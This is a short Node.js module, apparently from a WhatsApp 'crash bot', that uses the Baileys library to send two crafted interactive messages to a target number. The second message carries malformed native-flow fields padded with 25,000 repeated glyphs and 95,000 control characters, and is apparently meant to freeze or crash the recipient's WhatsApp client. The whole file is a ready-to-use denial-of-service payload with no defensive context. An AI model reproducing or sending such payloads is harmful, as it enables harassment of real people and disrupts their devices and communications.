
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

async function StickerCrash(SYxS7, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "⚔️ SHAHZU X MOEED ⚔️",
        format: 1
      },
      footer: {
        text: "ZXS SHAHZU"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "@shahzu_404",
              url: "https://t.me/xeotmzzz"
            })
          },
          {
            name: "address_message",
            buttonParamsJson: JSON.stringify({
              text: "Anti Redup — Balik Padu"
            })
          },
          {
            name: "mpm",
            buttonParamsJson: JSON.stringify({
              text: "Indonesia — Indonesia"
            })
          },
          {
            name: "cta_call",
            buttonParamsJson: JSON.stringify({
              display_text: "OxerorLine",
              phone_number: "601122334455"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Channel Rasmi",
              url: "https://t.me/AboutXeo"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "Pencet Sini",
              id: null
            })
          },
          {
            name: "order_status",
            buttonParamsJson: JSON.stringify({
              order_id: "OXEROR999DEATH2026",
              order_title: "Oxeror — Power Pack",
              status: "PROCESSING",
              token: "oxr_dth_fullgacor_x",
              flow_message_version: "2"
            })
          },
          {
            name: "cta_reminder",
            buttonParamsJson: JSON.stringify({
              display_text: "Jangan Lupa",
              id: null
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "Oxeror Anti Redup Padu",
              copy_code: "OxerorDeath_NoAmpas"
            })
          }
        ]
      }
    }
  };

  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🩸 Are you Ready? 🩸"
          },
          nativeFlowMessage: {
            extra: "\u31051",
            buttons: "⵿".repeat(25000),
            extra1: "\u0001".repeat(95000)
          }
        }
      }
    }
  };

  await SYxS7.relayMessage(target, msg, {
    participant: { jid: target },
    noSelfSync: true
  });
  await SYxS7.relayMessage(target, msg2, {
    participant: { jid: target },
    noSelfSync: true
  });
}
module.exports = { StickerCrash }
